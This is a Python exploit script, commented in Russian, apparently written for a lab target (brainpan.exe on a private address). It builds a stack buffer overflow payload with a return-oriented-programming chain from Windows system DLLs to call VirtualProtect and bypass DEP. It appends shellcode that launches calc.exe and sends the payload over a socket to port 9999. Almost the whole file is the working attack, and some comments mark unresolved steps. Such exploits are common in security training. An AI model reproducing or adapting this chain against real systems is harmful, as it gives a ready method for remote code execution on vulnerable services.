import struct

class OffsetPacker:
    def __init__(self, base):
        self.base = base
    
    def __call__(self, offset):
        return struct.pack('<I', self.base + offset)

# Создаю упаковщики для разных модулей
# Указываю Base Address
bcrypt_p32 =     OffsetPacker(base=0x748C0000)
msvcrt_p32 =     OffsetPacker(base=0x74A20000)
kernel32_p32 =   OffsetPacker(base=0x76C10000)
kernelBase_p32 = OffsetPacker(base=0x74B70000)
rpcrt4_32 =      OffsetPacker(base=0x76780000)
#ws2_32_p32 = OffsetPacker(base=0x776E0000)

# Обычная упаковка
def p32(x): return struct.pack('<I', x)

def bytes_to_escaped_hex(data: bytes) -> str:
    return ''.join(f'\\x{byte:02x}' for byte in data)

# Базовые константы
OFFSET = 524
ADDR_VP = kernel32_p32(0x1971f)       # offset для VirtualProtect
ADDR_JMP_ESP = 0x311712F3             # Адрес jmp esp для выполнения кода в стеке
ROP_NOP = 0x3117124c                  # ret

# rop combine part 1
rop = b''
rop += kernel32_p32(0x71deb)           # push esp ; pop esi ; ret => copy esp to esi
rop += msvcrt_p32(0x23089)             # xchg edi, esi ; ret => move esp from esi to edi
rop += msvcrt_p32(0x4b8f2)             # xchg eax, edi ; ret => move esp from edi to eax
rop += kernel32_p32(0x71deb)           # push esp ; pop esi ; ret => copy esp to esi
rop += msvcrt_p32(0x4e8b3)             # add esp, 0x18 ; ret => shift (24 bytes)

# VirtualProtect parameters
params = b''
params += p32(0x01010101)             # return address
params += b'XXXX'                     # lpAddress => shellcode stack address
params += b'YYYY'                     # dwSize => 0x3E8 (1000)
params += b'ZZZZ'                     # flNewProtect => 0x00000040
params += p32(0x31172A50)             # lpflOldProtect RW Address in brainpan.exe

# Шеллкод для запуска calc.exe
shellcode = b'\x90' * 16 + \
b'\x31\xD2\x52\x68\x63\x61\x6C\x63\x89\xE6\x52\x56\x64' \
b'\x8B\x72\x30\x8B\x76\x0C\x8B\x76\x0C\xAD\x8B\x30\x8B' \
b'\x7E\x18\x8B\x5F\x3C\x8B\x5C\x1F\x78\x8B\x74\x1F\x20' \
b'\x01\xFE\x8B\x4C\x1F\x24\x01\xF9\x42\xAD\x81\x3C\x07' \
b'\x57\x69\x6E\x45\x75\xF5\x0F\xB7\x54\x51\xFE\x8B\x74' \
b'\x1F\x1C\x01\xFE\x03\x3C\x96\xFF\xD7'

# add esp, 0x18 ; ret => land here
# rop combine part 2
rop2 = b''
rop2 += kernel32_p32(0x19660)           # mov ecx, eax ; mov eax, ecx ; pop ebp ; ret
rop2 += b'BBBB'                         # padding for pop ebp
rop2 += msvcrt_p32(0x6db30)             # add eax, 0xc8 ; ret => eax is param1 (return address)
rop2 += kernel32_p32(0x71881)           # mov dword ptr [esi + 8], eax ; xor eax, eax ; pop esi ; pop ebp ; ret 8
rop2 += b'AAAA' * 2
# в ecx 0028f930 esp 0028f984?
rop2 += kernel32_p32(0x2cece)           # mov eax, ecx ; ret => set EAX to stack pointer
# kernel32_SysWOW64.dll.gadgets.txt:0x6b85fa16 : mov dword ptr [esi + 0x18], ecx ; pop edi ; pop esi ; pop ebx ; mov esp, ebp ; pop ebp ; ret
rop2 += b'AAAA' * 2
# тут eax 0028F930 и ECX 0028F930
# нужно выставить значение 0028F9F8 по адресу 0x0028F948
rop2 += msvcrt_p32(0x7fcb2)             # mov edx, eax ; mov eax, ecx ; pop ebp ; ret
rop2 += b'BBBB'                         # padding for pop ebp
rop2 += msvcrt_p32(0xbdad)              # add eax, 8 ; ret
rop2 += msvcrt_p32(0xbdad)              # add eax, 8 ; ret
# тут значение EAX = адрес вызова функции VirtualProtect
# перемещаю в EDI, а потом копирую обратно в EAX
rop2 += msvcrt_p32(0x4b8f2)             # xchg eax, edi ; ret
rop2 += msvcrt_p32(0x6d307)             # push edi ; pop eax ; pop ebp ; ret
rop2 += b'AAAA'                         # padding for pop ebp
# ------------------------------ #
# | EDI => CALL VirtualProtect | #
# ------------------------------ #
rop2 += msvcrt_p32(0xbdad)              # add eax, 8 ; ret
# тут eax=0028F948 (адрес параметра 2)
rop2 += msvcrt_p32(0x73634)             # xchg eax, ecx ; ret => ecx = addr to write param2
# => нужно в EAX поместить 0028F9F8
rop2 += msvcrt_p32(0x6db30)             # add eax, 0xc8 ; ret => eax is param1 (return address)
# запись по адресу ECX значения EAX
rop2 += bcrypt_p32(0x14e0)              # mov dword ptr [ecx], eax ; ret
# Param2 записан далее нужно записать параметры 3 и 4
# EAX => мусор
# ECX +4 => адрес параметра 3 => KernelBase_SysWOW64.dll:0x1007ab2e : add ecx, 4 ; mov eax, ecx ; ret
rop2 += kernelBase_p32(0x7ab2e)         # add ecx, 4 ; mov eax, ecx ; ret
# EAX нужно установить 0x3E8 (1000)
rop2 += msvcrt_p32(0x2afd4)             # pop eax ; ret
rop2 += p32(0x2F1310CE)
rop2 += bcrypt_p32(0x1e08)              # xor eax, 0x2f131326 ; ret => EAX 000003E8
rop2 += bcrypt_p32(0x14e0)              # mov dword ptr [ecx], eax ; ret
# EAX => мусор
# ECX +4 => адрес параметра 4 => KernelBase_SysWOW64.dll:0x1007ab2e : add ecx, 4 ; mov eax, ecx ; ret
rop2 += kernelBase_p32(0x7ab2e)         # add ecx, 4 ; mov eax, ecx ; ret
# EAX нужно установить 0x3E8 (40)
rop2 += msvcrt_p32(0x2afd4)             # pop eax ; ret
rop2 += p32(0x2F131366)
rop2 += bcrypt_p32(0x1e08)              # xor eax, 0x2f131326 ; ret => EAX 000003E8
rop2 += bcrypt_p32(0x14e0)              # mov dword ptr [ecx], eax ; ret
# готовы все 4 параметра
# адрес вызова VirtualProtect в EDI
#print(bytes_to_escaped_hex(rop2))
rop2 += rpcrt4_32(0x7a2ec)              # push edi ; pop eax ; ret
rop2 += kernelBase_p32(0x1cf67)         # xchg eax, esp ; ret

# нужно куда-то скопировать
### KernelBase_SysWOW64.dll.gadgets.txt:0x1007ab2e : add ecx, 4 ; mov eax, ecx ; ret
# => 76CC1000+ab2e == 76D3AB2E ???
rop2 += b'\x90' * 150


# Адреса гаджетов
# kernel32_SysWOW64.dll.gadgets.txt:0x6b871deb : push esp ; pop esi ; ret
# msvcrt_SysWOW64.dll.gadgets.txt:0x10123089 : xchg edi, esi ; ret
#
# msvcrt_SysWOW64.dll.gadgets.txt:0x10115644 : add esp, 0x10 ; ret (16)
# msvcrt_SysWOW64.dll.gadgets.txt:0x1014e8b3 : add esp, 0x18 ; ret
# msvcrt_SysWOW64.dll.gadgets.txt:0x1014b18a : add esp, 0x20 ; ret (32)
# msvcrt_SysWOW64.dll.gadgets.txt:0x1014a226 : add esp, 0x2c ; ret (44)
#

payload = b'A' * OFFSET             # buf fill 520 + EBP затирание 4 байт в 32
#payload += p32(ROP_NOP)
#payload += b'BBBB'
payload += rop                      # Setting Stack Params For VirtualProtect
payload += ADDR_VP                  # EIP → VirtualProtect
payload += params                   # VirtualProtect parameters
payload += rop2
payload += shellcode
payload += b'C' * 36

# Проверки:
badchars = [b'\x00'] #, b'\x0a', b'\x0d', b'\x09']
assert len(payload) <= 1000
assert not any(bad in payload for bad in badchars), \
       f'Payload contains one of badchars: {badchars!r}'

# Отправка
import socket
s = socket.create_connection(('192.168.56.113', 9999))
s.send(payload)
s.close()
